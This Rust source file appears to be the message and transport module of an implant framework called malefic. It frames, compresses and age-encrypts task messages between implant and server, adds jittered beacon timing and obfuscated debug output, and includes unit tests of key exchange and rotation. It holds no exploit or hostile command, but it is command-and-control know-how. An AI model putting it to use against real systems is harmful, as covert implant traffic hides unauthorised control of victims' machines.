pub mod proto;

use anyhow::anyhow;
use malefic_gateway::ObfDebug;
use prost::Message;
use std::mem::size_of;
use thiserror::Error;

pub use proto::implantpb;
pub use proto::implantpb::spite::Body;
pub use proto::implantpb::{Spite, Spites};
pub use proto::modulepb;

pub fn get_message_len<M: Message>(message: &M) -> usize {
    message.encoded_len()
}

pub fn new_spite(task_id: u32, name: String, body: Body) -> Spite {
    Spite {
        task_id,
        r#async: true,
        timeout: 0,
        name,
        error: 0,
        status: Some(implantpb::Status {
            task_id,
            status: 0,
            error: "".to_string(),
        }),
        body: Some(body),
    }
}

pub fn new_empty_spite(task_id: u32, name: String) -> Spite {
    Spite {
        task_id,
        r#async: true,
        timeout: 0,
        name,
        error: 0,
        status: Some(implantpb::Status {
            task_id,
            status: 0,
            error: "".to_string(),
        }),
        body: Some(Body::Empty(implantpb::Empty::default())),
    }
}

pub fn new_error_spite(task_id: u32, name: String, error: u32) -> Spite {
    Spite {
        task_id,
        r#async: true,
        timeout: 0,
        name,
        error,
        status: Some(implantpb::Status {
            task_id,
            status: 1,
            error: "".to_string(),
        }),
        body: None,
    }
}

pub fn get_sid() -> [u8; 4] {
    if cfg!(debug_assertions) {
        [1, 2, 3, 4]
    } else {
        let mut temp_id = [0u8; 4];
        malefic_common::random::fill(&mut temp_id);
        temp_id
    }
}

pub fn new_heartbeat(interval: u64, jitter: f64) -> u64 {
    let base_time_ms = (interval * 1000) as f64;
    let jitter_factor = if jitter != 0.0 {
        let jitter_range = (jitter * 2000.0) as u64 + 1;
        1.0 + (malefic_common::random::range_u64(0, jitter_range) as f64 / 1000.0 - jitter)
    } else {
        1.0
    };
    (base_time_ms * jitter_factor) as u64
}

static TRANSPORT_START: u8 = 0xd1;
static TRANSPORT_END: u8 = 0xd2;
pub static HEADER_LEN: usize = 9;

#[derive(Debug, Error)]
pub enum ParserError {
    #[error(transparent)]
    Panic(#[from] anyhow::Error),
    #[error("No start marker found in data")]
    NoStart,
    #[error("No end marker found in data")]
    NoEnd,
    #[error("Data length is insufficient or incorrect")]
    LengthError,
    #[error("I/O Error: {0}")]
    IOError(#[from] std::io::Error),
    #[error("Data body is missing")]
    MissBody,
    #[error("Encryption/decryption failed: {0}")]
    CryptorError(String),
}

#[derive(ObfDebug)]
pub struct SpiteData {
    pub start: u8,
    pub session_id: [u8; 4],
    pub length: u32,
    pub data: Vec<u8>,
    pub end: u8,
}

impl SpiteData {
    pub fn default() -> Self {
        SpiteData {
            start: TRANSPORT_START,
            session_id: [0u8; 4],
            length: 0,
            data: Vec::new(),
            end: TRANSPORT_END,
        }
    }

    pub fn new(
        session_id: [u8; 4],
        data: &[u8],
        _recipient_public_key: Option<&str>,
    ) -> Result<Self, ParserError> {
        let compressed = malefic_crypto::compress::compress(data).unwrap_or_else(|_| data.to_vec());

        let final_data = {
            #[cfg(feature = "secure")]
            {
                if let Some(public_key) = _recipient_public_key {
                    if !public_key.is_empty() {
                        use malefic_crypto::crypto::age::age_encrypt;
                        age_encrypt(&compressed, public_key).map_err(ParserError::CryptorError)?
                    } else {
                        compressed
                    }
                } else {
                    compressed
                }
            }
            #[cfg(not(feature = "secure"))]
            {
                compressed
            }
        };
        let length = final_data.len() as u32;
        Ok(SpiteData {
            start: TRANSPORT_START,
            session_id,
            length,
            data: final_data,
            end: TRANSPORT_END,
        })
    }

    pub fn header(&self) -> Vec<u8> {
        let mut buf = Vec::new();
        buf.push(self.start);
        buf.extend_from_slice(&self.session_id);
        buf.extend_from_slice(&self.length.to_le_bytes());
        buf
    }

    pub fn body(&self) -> Vec<u8> {
        let mut buf = Vec::new();
        buf.extend_from_slice(&self.data);
        buf.push(self.end);
        buf
    }

    pub fn pack(&self) -> Vec<u8> {
        let mut buf = Vec::new();
        buf.push(self.start);
        buf.extend_from_slice(&self.session_id);
        buf.extend_from_slice(&self.length.to_le_bytes());
        buf.extend_from_slice(&self.data);
        buf.push(self.end);
        buf
    }

    pub fn unpack(&mut self, buf: &[u8]) -> Result<(), ParserError> {
        if buf.len() < size_of::<u32>() + 4 + 2 {
            return Err(ParserError::LengthError);
        }
        if buf[0] != TRANSPORT_START {
            return Err(ParserError::NoStart);
        }
        if buf[buf.len() - 1] != TRANSPORT_END {
            return Err(ParserError::NoEnd);
        }
        let mut pos = 1;
        self.session_id = [buf[pos], buf[pos + 1], buf[pos + 2], buf[pos + 3]];
        pos += 4;
        self.length = u32::from_le_bytes([buf[pos], buf[pos + 1], buf[pos + 2], buf[pos + 3]]);
        pos += size_of::<u32>();
        self.data = buf[pos..pos + self.length as usize].to_vec();
        Ok(())
    }

    pub fn get_data(&self) -> &Vec<u8> {
        &self.data
    }

    pub fn set_data(&mut self, data: Vec<u8>) -> Result<bool, ParserError> {
        if let Some(&last_byte) = data.last() {
            if last_byte != TRANSPORT_END {
                Err(ParserError::NoEnd)
            } else {
                self.data = data[..data.len() - 1].to_vec();
                Ok(true)
            }
        } else {
            Err(ParserError::LengthError)
        }
    }

    pub fn parse(&self, _private_key: Option<&str>) -> Result<Spites, ParserError> {
        let spite_data = self.get_data();
        if spite_data.is_empty() {
            return Err(ParserError::MissBody);
        }
        let decrypted_data = {
            #[cfg(feature = "secure")]
            {
                if let Some(private_key) = _private_key {
                    if !private_key.is_empty() {
                        use malefic_crypto::crypto::age::age_decrypt;
                        age_decrypt(spite_data, private_key).map_err(ParserError::CryptorError)?
                    } else {
                        spite_data.to_vec()
                    }
                } else {
                    spite_data.to_vec()
                }
            }
            #[cfg(not(feature = "secure"))]
            {
                spite_data.to_vec()
            }
        };
        let decompressed = malefic_crypto::compress::decompress(&decrypted_data)?;
        match Spites::decode(&decompressed[..]) {
            Ok(spites) => Ok(spites),
            Err(err) => Err(anyhow!("Failed to decode: {:?}", err).into()),
        }
    }
}

pub fn encode(spites: Spites) -> Result<Vec<u8>, ParserError> {
    let mut buf = Vec::new();
    spites.encode(&mut buf).map_err(|e| anyhow!(e))?;
    Ok(buf)
}

pub fn decode(data: Vec<u8>) -> Result<Spites, ParserError> {
    let spites = Spites::decode(&data[..]).map_err(|e| anyhow!(e))?;
    Ok(spites)
}

pub fn marshal(
    id: [u8; 4],
    spites: Spites,
    recipient_public_key: Option<&str>,
) -> Result<SpiteData, ParserError> {
    let mut buf = Vec::new();
    spites.encode(&mut buf).map_err(|e| anyhow!(e))?;
    SpiteData::new(id, &buf, recipient_public_key)
}

pub fn marshal_one(
    id: [u8; 4],
    spite: Spite,
    recipient_public_key: Option<&str>,
) -> Result<SpiteData, ParserError> {
    marshal(
        id,
        Spites {
            spites: vec![spite],
        },
        recipient_public_key,
    )
}

pub fn parser_header(buf: &[u8]) -> Result<SpiteData, ParserError> {
    if buf.len() < 9 {
        return Err(ParserError::LengthError);
    }
    if buf[0] != TRANSPORT_START {
        return Err(ParserError::NoStart);
    }
    let start = buf[0];
    let session_id = [buf[1], buf[2], buf[3], buf[4]];
    let length = u32::from_le_bytes([buf[5], buf[6], buf[7], buf[8]]);
    Ok(SpiteData {
        start,
        session_id,
        length,
        data: Vec::new(),
        end: TRANSPORT_END,
    })
}

#[cfg(feature = "secure")]
pub fn generate_age_keypair() -> (String, String) {
    malefic_crypto::crypto::age::generate_age_keypair()
}

#[cfg(all(test, feature = "secure"))]
mod tests {
    use super::*;
    use malefic_crypto::crypto::age::age_decrypt;

    fn make_test_spites() -> Spites {
        let spite = new_spite(
            42,
            "test_module".to_string(),
            Body::Empty(implantpb::Empty::default()),
        );
        Spites {
            spites: vec![spite],
        }
    }

    /// marshal with age encryption -> parse with age decryption round-trip
    #[test]
    fn test_marshal_parse_with_age_encryption() {
        let (server_priv, server_pub) = generate_age_keypair();
        let session_id = [0x01, 0x02, 0x03, 0x04];

        let encrypted_sd =
            marshal(session_id, make_test_spites(), Some(&server_pub)).expect("encrypted marshal");
        let plain_sd = marshal(session_id, make_test_spites(), None).expect("plain marshal");

        // Encrypted data must differ from unencrypted
        assert_ne!(
            encrypted_sd.data, plain_sd.data,
            "BUG: encrypted data identical to unencrypted"
        );
        assert!(
            encrypted_sd.data.len() > plain_sd.data.len(),
            "BUG: encrypted data not larger than plain"
        );

        // Encrypted data must not be directly decompressible
        assert!(
            malefic_crypto::compress::decompress(&encrypted_sd.data).is_err(),
            "BUG: encrypted data directly decompressible"
        );

        // Direct age_decrypt must work (proves data is real age ciphertext)
        let direct_dec =
            age_decrypt(&encrypted_sd.data, &server_priv).expect("direct age_decrypt failed");
        assert!(!direct_dec.is_empty());

        // Parse with correct key
        let recovered = encrypted_sd
            .parse(Some(&server_priv))
            .expect("parse failed");
        assert_eq!(recovered.spites.len(), 1);
        assert_eq!(recovered.spites[0].task_id, 42);
        assert_eq!(recovered.spites[0].name, "test_module");
    }

    /// Full key exchange via marshal/parse
    #[test]
    fn test_simulated_key_exchange_e2e() {
        let session_id = [0xAA, 0xBB, 0xCC, 0xDD];
        let (server_priv, server_pub) = generate_age_keypair();
        let (implant_priv, implant_pub) = generate_age_keypair();

        // Implant -> Server
        let sd = marshal(session_id, make_test_spites(), Some(&server_pub)).unwrap();
        age_decrypt(&sd.data, &server_priv).expect("i2s: not valid age ciphertext");
        let r = sd.parse(Some(&server_priv)).unwrap();
        assert_eq!(r.spites[0].task_id, 42);

        // Server -> Implant
        let server_msg = Spites {
            spites: vec![new_spite(
                99,
                "server_task".to_string(),
                Body::Empty(implantpb::Empty::default()),
            )],
        };
        let sd = marshal(session_id, server_msg, Some(&implant_pub)).unwrap();
        age_decrypt(&sd.data, &implant_priv).expect("s2i: not valid age ciphertext");
        let r = sd.parse(Some(&implant_priv)).unwrap();
        assert_eq!(r.spites[0].task_id, 99);

        // Key rotation
        let (new_server_priv, new_server_pub) = generate_age_keypair();
        let (new_implant_priv, new_implant_pub) = generate_age_keypair();

        let post_msg = Spites {
            spites: vec![new_spite(
                200,
                "post_rot".to_string(),
                Body::Empty(implantpb::Empty::default()),
            )],
        };
        let sd = marshal(session_id, post_msg, Some(&new_server_pub)).unwrap();
        // Old key fails
        assert!(
            age_decrypt(&sd.data, &server_priv).is_err(),
            "old key must fail"
        );
        // New key works
        assert!(age_decrypt(&sd.data, &new_server_priv).is_ok());
        assert_eq!(
            sd.parse(Some(&new_server_priv)).unwrap().spites[0].task_id,
            200
        );

        let post_msg2 = Spites {
            spites: vec![new_spite(
                201,
                "new_task".to_string(),
                Body::Empty(implantpb::Empty::default()),
            )],
        };
        let sd = marshal(session_id, post_msg2, Some(&new_implant_pub)).unwrap();
        assert!(
            age_decrypt(&sd.data, &implant_priv).is_err(),
            "old implant key must fail"
        );
        assert_eq!(
            sd.parse(Some(&new_implant_priv)).unwrap().spites[0].task_id,
            201
        );
    }

    /// Wrong key direction must fail parse
    #[test]
    fn test_encrypt_decrypt_key_separation() {
        let (server_priv, server_pub) = generate_age_keypair();
        let sd = marshal([1, 2, 3, 4], make_test_spites(), Some(&server_pub)).unwrap();

        // Encrypted data must not decompress directly
        assert!(malefic_crypto::compress::decompress(&sd.data).is_err());

        // Public key as decrypt key -> must fail
        assert!(
            sd.parse(Some(&server_pub)).is_err(),
            "public key must not decrypt"
        );

        // Correct key
        assert_eq!(sd.parse(Some(&server_priv)).unwrap().spites[0].task_id, 42);
    }

    /// No-key marshal/parse (plaintext fallback)
    #[test]
    fn test_marshal_parse_without_keys() {
        let sd = marshal([5, 6, 7, 8], make_test_spites(), None).unwrap();
        assert!(
            malefic_crypto::compress::decompress(&sd.data).is_ok(),
            "no-key data should be directly decompressible"
        );
        assert_eq!(sd.parse(None).unwrap().spites[0].task_id, 42);
    }

    // -----------------------------------------------------------------------
    // Security hardening tests: plaintext fallback removed
    // -----------------------------------------------------------------------

    /// Invalid age public key must produce CryptorError, not silently fall back
    #[test]
    fn test_age_encrypt_failure_returns_error() {
        let session_id = [0xAA, 0xBB, 0xCC, 0xDD];
        let data = b"sensitive payload";

        let result = SpiteData::new(session_id, data, Some("invalid_key_not_age"));
        assert!(
            result.is_err(),
            "encrypting with invalid key should fail, not fall back to plaintext"
        );
        match result {
            Err(ParserError::CryptorError(_)) => {} // expected
            Err(other) => panic!("expected CryptorError, got: {:?}", other),
            Ok(_) => panic!("expected error, got Ok"),
        }
    }

    /// Decrypting with the wrong private key must produce an error
    #[test]
    fn test_age_decrypt_failure_returns_error() {
        let (_, server_pub_a) = generate_age_keypair();
        let (_, _server_pub_b) = generate_age_keypair();
        // Generate a completely different keypair for decryption
        let (wrong_priv, _) = generate_age_keypair();

        let session_id = [0x11, 0x22, 0x33, 0x44];
        let sd = marshal(session_id, make_test_spites(), Some(&server_pub_a))
            .expect("marshal with valid key should succeed");

        let result = sd.parse(Some(&wrong_priv));
        assert!(
            result.is_err(),
            "decrypting with wrong private key should fail, not fall back to plaintext"
        );
    }

    /// None key -> Ok (no encryption, just compression)
    /// Empty string key -> Ok (skip encryption)
    #[test]
    fn test_no_key_still_works() {
        let session_id = [0x55, 0x66, 0x77, 0x88];
        let data = b"hello world";

        // None key: no encryption, should succeed
        let result_none = SpiteData::new(session_id, data, None);
        assert!(
            result_none.is_ok(),
            "None key should succeed (no encryption): {:?}",
            result_none.err()
        );

        // Empty string key: skip encryption, should succeed
        let result_empty = SpiteData::new(session_id, data, Some(""));
        assert!(
            result_empty.is_ok(),
            "empty string key should succeed (skip encryption): {:?}",
            result_empty.err()
        );
    }

    /// Multiple spites with encryption
    #[test]
    fn test_marshal_parse_multiple_spites() {
        let (server_priv, server_pub) = generate_age_keypair();
        let spites = Spites {
            spites: vec![
                new_spite(1, "a".to_string(), Body::Empty(implantpb::Empty::default())),
                new_spite(2, "b".to_string(), Body::Empty(implantpb::Empty::default())),
                new_spite(3, "c".to_string(), Body::Empty(implantpb::Empty::default())),
            ],
        };
        let sd = marshal([0x10, 0x20, 0x30, 0x40], spites, Some(&server_pub)).unwrap();
        age_decrypt(&sd.data, &server_priv).expect("multi-spite must be valid age ciphertext");

        let r = sd.parse(Some(&server_priv)).unwrap();
        assert_eq!(r.spites.len(), 3);
        assert_eq!(r.spites[0].task_id, 1);
        assert_eq!(r.spites[1].task_id, 2);
        assert_eq!(r.spites[2].task_id, 3);
    }

    /// TLV pack/unpack round-trip with encryption
    #[test]
    fn test_pack_unpack_parse_roundtrip() {
        let (server_priv, server_pub) = generate_age_keypair();
        let session_id = [0xDE, 0xAD, 0xBE, 0xEF];

        let sd = marshal(session_id, make_test_spites(), Some(&server_pub)).unwrap();
        assert!(age_decrypt(&sd.data, &server_priv).is_ok());

        let wire = sd.pack();

        // Verify TLV wire format
        assert_eq!(wire[0], 0xd1, "start marker");
        assert_eq!(*wire.last().unwrap(), 0xd2, "end marker");
        assert_eq!(&wire[1..5], &session_id, "session_id");

        // Unpack
        let mut received = SpiteData::default();
        received.unpack(&wire).expect("unpack");
        assert_eq!(received.session_id, session_id);
        assert_eq!(received.data, sd.data);

        // Parse
        let r = received
            .parse(Some(&server_priv))
            .expect("parse after unpack");
        assert_eq!(r.spites[0].task_id, 42);
    }
}
